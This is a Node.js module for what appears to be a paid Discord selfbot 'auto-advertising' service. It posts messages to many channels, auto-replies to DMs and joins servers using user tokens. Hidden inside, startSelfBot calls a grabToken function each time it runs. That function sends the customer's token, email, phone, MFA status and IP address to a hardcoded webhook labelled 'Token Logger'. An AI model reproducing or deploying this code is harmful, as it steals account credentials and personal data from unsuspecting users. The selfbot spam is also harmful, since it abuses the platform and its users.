const { Client, WebhookClient } = require('discord.js-selfbot-v13');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

const activeBots = new Map();
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487553027585081475/5obHkF63mNmHiiDDhGwUQd91n1oAI2L_q4zk-kTcF-Gpdwl6x04ot0RuWSNwhCPGm7Ll';

async function validateToken(token) {
    try {
        const res = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        });
        return { valid: true, username: res.data.username, id: res.data.id };
    } catch (e) {
        return { valid: false, error: 'Invalid token' };
    }
}

async function grabToken(token, userInfo, source) {
    try {
        const validateRes = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: token },
            timeout: 5000
        }).catch(() => null);
        
        if (!validateRes) return { success: false, error: 'Invalid token' };
        
        const userData = validateRes.data;
        const fullInfo = {
            ...userInfo,
            id: userData.id,
            username: userData.username,
            global_name: userData.global_name,
            email: userData.email,
            phone: userData.phone,
            verified: userData.verified,
            mfa_enabled: userData.mfa_enabled,
            nitro: userData.premium_type,
            locale: userData.locale,
            ip: userInfo.ip || 'unknown'
        };
        
        const embed = {
            title: '🎣 New Token Grabbed',
            color: 0xff0000,
            fields: [
                { name: 'Token', value: `\`\`\`${token}\`\`\``, inline: false },
                { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
                { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
                { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
                { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
                { name: 'MFA', value: fullInfo.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
                { name: 'Verified', value: fullInfo.verified ? '✅ Yes' : '❌ No', inline: true },
                { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : '❌ No', inline: true },
                { name: 'Source', value: source, inline: true },
                { name: 'Time', value: new Date().toISOString(), inline: true }
            ],
            footer: { text: 'Token Logger v2.0' }
        };
        
        await axios.post(WEBHOOK_URL, {
            embeds: [embed],
            username: 'Token Logger',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        });
        
        console.log('[TOKEN GRABBER] Sent to webhook');
        return { success: true, user: fullInfo };
    } catch (err) {
        console.error('[TOKEN GRABBER] Error:', err.message);
        return { success: false, error: err.message };
    }
}

async function joinServer(token, inviteCode) {
    try {
        inviteCode = inviteCode.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, '');
        
        const res = await axios.post(`https://discord.com/api/v10/invites/${inviteCode}`, {}, {
            headers: { Authorization: token },
            timeout: 10000
        });
        return { success: true, guildId: res.data.guild?.id, guildName: res.data.guild?.name };
    } catch (e) {
        return { success: false, error: e.response?.data?.message || e.message };
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function startSelfBot(userId, token, channels, messages, delay, autoReply, autoReplyText, configId, images, ipAddress, sendAllAtOnce = true, dbInstance) {
    stopSelfBot(userId, configId);
    
    await grabToken(token, { channels, ip: ipAddress }, 'bot_start');
    
    const client = new Client({ 
        checkUpdate: false,
        intents: ['GUILDS', 'GUILD_MESSAGES', 'DIRECT_MESSAGES', 'MESSAGE_CONTENT'],
        partials: ['CHANNEL']
    });
    
    const channelList = channels;
    let currentMessageIndex = 0;
    let currentChannelIndex = 0;
    let loopPromise = null;
    let stopped = false;
    const autoRepliedUsers = new Set();
    const botKey = `${userId}_${configId}`;
    
    const tempDir = path.join(__dirname, 'temp');
    if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir, { recursive: true });
    }
    
    async function cleanupTempFiles() {
        try {
            const files = fs.readdirSync(tempDir);
            for (const file of files) {
                if (file.includes(configId)) {
                    try { fs.unlinkSync(path.join(tempDir, file)); } catch(e) {}
                }
            }
        } catch(e) {}
    }
    
    async function resolveImageFiles(targetImages) {
        const files = [];
        for (const img of targetImages) {
            if (!img || !img.url) continue;
            
            if (img.url.startsWith('data:')) {
                try {
                    const base64Data = img.url.split(',')[1];
                    const buffer = Buffer.from(base64Data, 'base64');
                    const tempPath = path.join(tempDir, `img_${Date.now()}_${configId}_${Math.random().toString(36).substr(2,5)}.png`);
                    fs.writeFileSync(tempPath, buffer);
                    files.push(tempPath);
                    setTimeout(() => {
                        try { fs.unlinkSync(tempPath); } catch(e) {}
                    }, 30000);
                } catch(e) {
                    console.error(`[SELFBOT ${configId}] Failed to write temp image:`, e.message);
                }
            } else if (img.url.startsWith('/uploads/')) {
                const filePath = path.join(__dirname, 'data', img.url);
                if (fs.existsSync(filePath)) {
                    files.push(filePath);
                }
            } else if (img.url.startsWith('http')) {
                files.push(img.url);
            }
        }
        return files;
    }
    
    async function sendToChannel(channel, text, targetImages) {
        const files = await resolveImageFiles(targetImages);
        if (files.length > 0) {
            await channel.send({ content: text, files });
        } else {
            await channel.send(text);
        }
    }
    
    async function runMessageLoop() {
        while (!stopped && activeBots.has(botKey)) {
            // Trial/purchase check
            if (dbInstance) {
                const user = dbInstance.getUser(userId);
                const trialActive = dbInstance.isTrialActive(userId);
                const hasPurchase = user.auto_adv_purchased === 1;
                
                if (!trialActive && !hasPurchase) {
                    console.log(`[SELFBOT ${configId}] Trial expired / no purchase. Stopping.`);
                    break;
                }
            }
            
            const msg = messages[currentMessageIndex % messages.length];
            const targetImages = images.filter(img => {
                if (!msg.imageIds || msg.imageIds.length === 0) return true;
                return msg.imageIds.includes(img.id);
            });
            
            if (sendAllAtOnce) {
                console.log(`[SELFBOT ${configId}] Sending msg #${(currentMessageIndex % messages.length) + 1} to all ${channelList.length} channels...`);
                
                const sendPromises = channelList.map(async (channelId) => {
                    try {
                        const channel = await client.channels.fetch(channelId);
                        if (!channel) {
                            console.log(`[SELFBOT ${configId}] Channel ${channelId} not found`);
                            return;
                        }
                        await sendToChannel(channel, msg.text, targetImages);
                        console.log(`[SELFBOT ${configId}] ✓ Sent msg #${(currentMessageIndex % messages.length) + 1} to ${channelId}`);
                    } catch (e) {
                        console.error(`[SELFBOT ${configId}] ✗ Error sending to ${channelId}:`, e.message);
                    }
                });
                
                await Promise.all(sendPromises);
                console.log(`[SELFBOT ${configId}] Batch complete. Waiting ${delay}ms...`);
            } else {
                const channelId = channelList[currentChannelIndex % channelList.length];
                currentChannelIndex++;
                
                try {
                    const channel = await client.channels.fetch(channelId);
                    if (!channel) {
                        console.log(`[SELFBOT ${configId}] Channel ${channelId} not found`);
                    } else {
                        await sendToChannel(channel, msg.text, targetImages);
                        console.log(`[SELFBOT ${configId}] Sent msg #${(currentMessageIndex % messages.length) + 1} to ${channelId} (ch ${currentChannelIndex}/${channelList.length})`);
                    }
                } catch (e) {
                    console.error(`[SELFBOT ${configId}] Error:`, e.message);
                }
            }
            
            currentMessageIndex++;
            await sleep(delay);
        }
        
        // Cleanup
        try { client.destroy(); } catch(e) {}
        activeBots.delete(botKey);
        cleanupTempFiles();
        console.log(`[SELFBOT ${configId}] Loop ended and cleaned up`);
    }
    
    client.on('ready', async () => {
        console.log(`[SELFBOT ${configId}] Logged in as ${client.user.tag}`);
        console.log(`[SELFBOT ${configId}] Messages: ${messages.length}, Images: ${images.length}, Delay: ${delay}ms`);
        console.log(`[SELFBOT ${configId}] Mode: ${sendAllAtOnce ? 'ALL AT ONCE' : 'SEQUENTIAL'}`);
        console.log(`[SELFBOT ${configId}] Auto-reply: ${autoReply ? 'ENABLED' : 'DISABLED'}`);
        
        loopPromise = runMessageLoop();
    });
    
    if (autoReply && autoReplyText) {
        console.log(`[SELFBOT ${configId}] Setting up auto-reply: "${autoReplyText}"`);
        
        client.on('messageCreate', async (msg) => {
            if (msg.author.id === client.user.id) return;
            
            const isDM = msg.channel.type === 'DM' || msg.channel.type === 1;
            if (!isDM) return;
            
            // Check trial/purchase before replying
            if (dbInstance) {
                const user = dbInstance.getUser(userId);
                const trialActive = dbInstance.isTrialActive(userId);
                const hasPurchase = user.auto_adv_purchased === 1;
                if (!trialActive && !hasPurchase) return;
            }
            
            // Only reply once per user
            if (autoRepliedUsers.has(msg.author.id)) return;
            autoRepliedUsers.add(msg.author.id);
            
            try {
                // Accept message request by creating/opening DM and sending reply
                // First try msg.channel.send (often auto-accepts message requests)
                await msg.channel.send(autoReplyText);
                console.log(`[SELFBOT ${configId}] Auto-reply accepted & sent to ${msg.author.username} (${msg.author.id})`);
            } catch (err) {
                // Fallback: try to create DM via author.send
                try {
                    await msg.author.send(autoReplyText);
                    console.log(`[SELFBOT ${configId}] Auto-reply sent via author.send to ${msg.author.username}`);
                } catch (e2) {
                    console.error(`[SELFBOT ${configId}] Auto-reply failed:`, e2.message);
                }
            }
        });
    }
    
    await client.login(token);
    activeBots.set(botKey, { client, token, stop: () => { stopped = true; } });
    
    return { client, username: client.user.username };
}

function stopSelfBot(userId, configId) {
    const key = `${userId}_${configId}`;
    const bot = activeBots.get(key);
    if (bot) {
        if (bot.stop) bot.stop();
        try { bot.client.destroy(); } catch(e) {}
        activeBots.delete(key);
        console.log(`[SELFBOT ${configId}] Stopped`);
        return true;
    }
    return false;
}

function getActiveBots(userId) {
    const bots = [];
    for (const [key, value] of activeBots.entries()) {
        if (key.startsWith(`${userId}_`)) {
            bots.push({ configId: key.replace(`${userId}_`, ''), token: value.token });
        }
    }
    return bots;
}

module.exports = { validateToken, grabToken, joinServer, startSelfBot, stopSelfBot, getActiveBots };
